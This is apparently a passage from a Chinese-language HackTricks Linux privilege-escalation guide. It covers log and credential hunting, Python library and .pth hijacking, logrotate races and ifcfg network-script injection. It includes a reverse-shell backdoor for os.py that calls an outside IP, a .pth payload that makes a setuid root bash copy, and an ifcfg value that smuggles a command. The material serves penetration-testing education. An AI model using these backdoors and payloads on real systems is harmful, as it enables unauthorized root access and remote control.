[Passpie 的默认数据库](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) 位于 `~/.passpie/`，其中包含 `.keys` 密钥环，以及存放在组目录下的加密 `.pass` 凭据文件。能看到数据库目录只能提供路径线索：请确认你能访问密钥和相关加密条目、是否需要主密码，以及找回的凭据是否属于权限更高的账户。Passpie 还支持[自定义数据库路径](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)，因此默认路径并不能涵盖所有情况。自动化枚举时应仅列出元数据，不要导出凭据或打印密钥材料。

### 日志

如果你可以读取日志，可能会在其中找到**有趣/机密信息**。日志越奇怪，可能越值得关注。\
此外，一些配置“**不当**”（可能被植入后门？）的**audit logs**，可能允许你将**密码记录**到 audit logs 中，具体说明请参阅这篇文章：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

为了**读取日志**，[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) 组会很有帮助。

### Shell 文件

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 通用 Creds 搜索/正则表达式

你还应该检查文件名或文件内容中包含“**password**”的文件，并检查日志中的 IP 和电子邮件地址，或使用哈希正则表达式。\
这里不打算列出所有这些操作的具体方法，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python library hijacking

如果你知道 Python 脚本将从**哪里**执行，并且你**可以写入**该目录或**修改 Python 库**，就可以修改 OS 库并植入后门（如果你能写入 Python 脚本的执行目录，就复制并粘贴 os.py 库）。

要给该库**植入后门**，只需在 os.py 库末尾添加以下代码行（修改 IP 和 PORT）：

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### 可写的 `.pth` 文件由 `site.addsitedir()` 处理

不要将 `site.addsitedir(DIR)` 等同于 `sys.path.append(DIR)`。它还会处理 `DIR` 中的每个 `*.pth` 文件。以 `import` 后跟空格或制表符开头的行会作为 Python 代码执行。路径行则会相对于 site 目录解析，并且只会在路径存在时添加。<sup>[[38]](#references)</sup>

如果一个 sudo 允许执行的 Python 程序或其他特权 Python 程序对当前用户或其所属组可写的目录调用 `site.addsitedir()`，就会导致 privilege escalation。特权程序在设置导入路径时、执行其正常操作之前，就会运行 `.pth` 代码。<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

可执行的 `.pth` 内容必须写在一行中，但可以用分号分隔多条语句。例如，root 执行路径可以创建一个 setuid Bash 副本；使用 `-p` 调用 Bash，使其保留有效 ID。<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` 选项只会禁用 Python 自动执行的 `site` 初始化。它无法保护显式导入 `site` 并调用 `site.addsitedir()` 的程序。将攻击者可写目录从特权导入路径中移除，并确保目录及其 `.pth` 文件仅由特权管理员拥有和写入。<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate 利用

当特权 `logrotate` 任务实际轮转某个日志，且低权限用户可以在轮转期间替换或重定向该日志所在目录时，就可能形成跨用户文件写入路径。仅仅发现日志可写，只能作为调查线索。请确认当前生效的具体规则及其 `create`、`olddir` 和 `su` 指令；调度程序的有效身份；日志父目录的写入和搜索权限；以及已安装的构建版本和策略是否允许更改目标路径。要让写入启动文件变成命令执行，后续的特权 shell 还必须加载生成的文件。请检查调度计划、规则、版本和打包信息，以及路径元数据，不要触发轮转或尝试竞争条件。

> [!TIP]
> 不要仅根据 `3.18.0` 或任何版本字符串来判断是否可利用。[上游变更日志](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)记录了多个版本中针对目录和符号链接的加固措施，发行版也可能回移修复。[上游手册](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)建议：当 root 在非特权用户控制的目录中轮转日志时，应使用 `su`；请核实实际生效的规则及行为。

关于该漏洞的更多信息，请参阅此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用该漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** 非常相似，因此每当发现自己能够修改日志时，都要检查由谁管理这些日志，并确认是否能通过将日志替换为符号链接来提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

如果低权限用户可以创建或修改 `ifcfg-*` 文件，**且**特权网络激活路径会读取该确切文件，那么它就是一个值得检查的线索。请确认实际生效的文件和目录权限、所选接口、已安装的 `ifup`/`ifdown` 实现，以及调用它们的用户。仅文件可写并不会导致代码执行。[Red Hat 的 RHEL 7 网络指南](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)区分了旧版 network scripts 和 NetworkManager：后者本身不会触发前者。[RHEL 8 文档](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)说明，其默认的 `ifup`/`ifdown` 使用 NetworkManager，而可选的 legacy 软件包提供 shell 脚本。

在实际使用特权 legacy scripts 的系统上，未加引号且由 shell 加载的 `ifcfg-*` 赋值（例如 `NAME=`）可能跨越代码执行边界。请核实具体的解析器、值和激活路径；不要仅凭文件名或系统中存在 NetworkManager 就推断会由 shell 解释。即使调用者无法直接编辑文件，若某个 sudo 允许的包装程序会将调用者输入写入 `ifcfg-*` 文件，然后调用 legacy `ifup`，也会形成通往该边界的另一条路径。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

（_注意 Network 和 /bin/id 之间的空格_）

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 是 System V init（SysVinit）的 **脚本** 所在位置。SysVinit 是 **经典的 Linux 服务管理系统**。其中包含用于 `start`、`stop`、`restart`，有时也用于 `reload` 服务的脚本。可以直接执行这些脚本，也可以通过 `/etc/rc?.d/` 中的符号链接执行。在 Redhat 系统中，另一个路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关。Upstart 是 Ubuntu 引入的较新 **服务管理系统**，使用配置文件执行服务管理任务。尽管系统已转向 Upstart，由于 Upstart 中的兼容层，SysVinit 脚本仍会与 Upstart 配置一同使用。

**systemd** 是一种现代化的初始化和服务管理器，提供按需启动守护进程、管理自动挂载以及创建系统状态快照等高级功能。它将文件分别存放在发行版软件包使用的 `/usr/lib/systemd/` 和管理员修改使用的 `/etc/systemd/system/` 中，从而简化系统管理流程。<sup>[[21]](#references)</sup>

## 其他技巧

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 从受限 Shell 中逃逸


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting frameworks：manager-channel 滥用

Android rooting frameworks 通常会 hook 一个 syscall，以便向 userspace manager 暴露特权 kernel 功能。薄弱的 manager 身份验证（例如基于 FD 顺序的签名检查或不安全的密码方案）可能使本地 app 冒充 manager，并在已 root 的设备上提权至 root。了解更多信息及 exploitation 细节，请参阅：


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools 服务发现 LPE（CWE-426）：通过基于 regex 的 exec（CVE-2025-41244）

VMware Tools/Aria Operations 中由 regex 驱动的服务发现功能，可能从进程命令行中提取二进制文件路径，并在特权上下文中使用 -v 执行该文件。过于宽松的匹配模式（例如使用 \S）可能匹配攻击者放置在可写位置（例如 /tmp/httpd）的监听程序，导致以 root 身份执行（CWE-426 不可信搜索路径）。<sup>[[27]](#references)</sup>

在此了解更多信息，并查看适用于其他发现/监控技术栈的通用模式：

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel 安全防护

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc 工具

### **查找 Linux 本地 privilege escalation 攻击向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**： [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 选项)\
**Enumy**： [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check：** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker：** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot：** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop：** 枚举 Linux 和 MAC 中的 kernel 漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit：** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester：** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail（物理访问）：** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多脚本汇总**：[https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning（Crontab UI privesc，复用 zip -P 凭据）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era：伪造 .text_sig payload，供 cron 执行的 monitor 使用](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025：Neighborhood Watch 绕过（sudo env_keep PATH 劫持）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux 基础 Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation 指南](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻击与防御：2016 年 Linux Privilege Escalation 技术](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [没人会想到命令执行！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD)（Linux Privilege Escalation）](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – 实验练习演练 - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation：Linux Priv Escalation 技巧与窍门](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i：Linux 枚举与 Privilege Escalation 工具](https://github.com/rtcrowley/linux-private-i)
- [14] [什么是 Socket？](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [连接到 D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables Linux Privilege Escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo 第 2 部分 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [如何在 Linux 上管理 ACL](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [通过 network-scripts 获取 Redhat/CentOS root 权限](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [什么是 systemd？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（通过日志进行 bash 算术注入，完整攻击链）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash 手册 – BASH_ENV（非交互式启动文件）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink privesc）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron 复制 → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 你指定什么名称，VMware 就提权执行什么（CVE-2025-41244）](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463：Sudo Chroot 权限提升](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 和 CVE-2025-32463 Sudo 权限提升漏洞](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC 仓库目录](https://peps.python.org/pep-3147/)
- [32] [Python importlib 文档](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec 发布的推文](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - 在 Linux 上记录密码](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate 竞态条件详解](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 文档 – `site` 和路径配置文件](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
